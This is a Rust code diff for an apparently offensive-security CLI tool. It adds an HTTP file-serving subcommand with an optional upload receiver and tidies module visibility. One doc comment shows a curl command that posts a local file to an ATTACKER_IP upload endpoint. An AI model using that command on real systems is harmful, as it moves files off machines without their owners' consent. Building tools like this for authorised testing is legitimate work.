@@ -3,21 +3,22 @@ use std::path::PathBuf;
 
 use clap::Subcommand;
 
-pub mod callback;
-pub mod proxy;
-pub mod send;
+mod callback;
+mod proxy;
+mod send;
+mod serve;
 
 use self::proxy::HttpProxyFormat;
 use crate::http::target::HttpTarget;
 
 #[derive(Debug, Subcommand)]
-pub(in crate::cli) enum HttpProxyRulesCommand {
+pub(super) enum HttpProxyRulesCommand {
     /// Print an example proxy rules configuration to stdout
     Example,
 }
 
 #[derive(Debug, Subcommand)]
-pub(in crate::cli) enum HttpProxyCommand {
+pub(super) enum HttpProxyCommand {
     /// Proxy rules utilities
     #[command(arg_required_else_help = true)]
     Rules {
@@ -27,7 +28,7 @@ pub(in crate::cli) enum HttpProxyCommand {
 }
 
 #[derive(Debug, Subcommand)]
-pub(in crate::cli) enum HttpCommand {
+pub(super) enum HttpCommand {
     /// Start an HTTP listener that logs incoming requests
     Callback {
         /// Local IP address to listen on
@@ -86,10 +87,27 @@ pub(in crate::cli) enum HttpCommand {
         #[arg(short, long)]
         output: Option<PathBuf>,
     },
+    /// Serve files over HTTP (and optionally accept uploads)
+    Serve {
+        /// Local IP address to listen on
+        #[arg(long, default_value_t = IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)))]
+        ip: IpAddr,
+        /// Local TCP port to listen on
+        #[arg(long, default_value_t = 8000)]
+        port: u16,
+        /// Directory to serve
+        #[arg(long, default_value = ".")]
+        dir: PathBuf,
+        /// Accept file uploads (PUT/POST) and save them at `<dir>/uploads/<filename>`.
+        ///
+        /// Command example: `curl -X POST --data-binary "@<path-to-file>" -H "X-Filename: <file-name>" http://<ATTACKER_IP>:<PORT>/upload`.
+        #[arg(long, default_value_t = false)]
+        upload: bool,
+    },
 }
 
 impl HttpCommand {
-    pub(in crate::cli) async fn run(self) -> Result<(), Box<dyn std::error::Error>> {
+    pub(super) async fn run(self) -> Result<(), Box<dyn std::error::Error>> {
         match self {
             Self::Callback { ip, port } => callback::run(ip, port).await?,
             Self::Proxy {
@@ -123,6 +141,12 @@ impl HttpCommand {
                 file,
                 output,
             } => send::run(target, file, output).await?,
+            Self::Serve {
+                ip,
+                port,
+                dir,
+                upload,
+            } => serve::run(ip, port, dir, upload).await?,
         }
 
         Ok(())
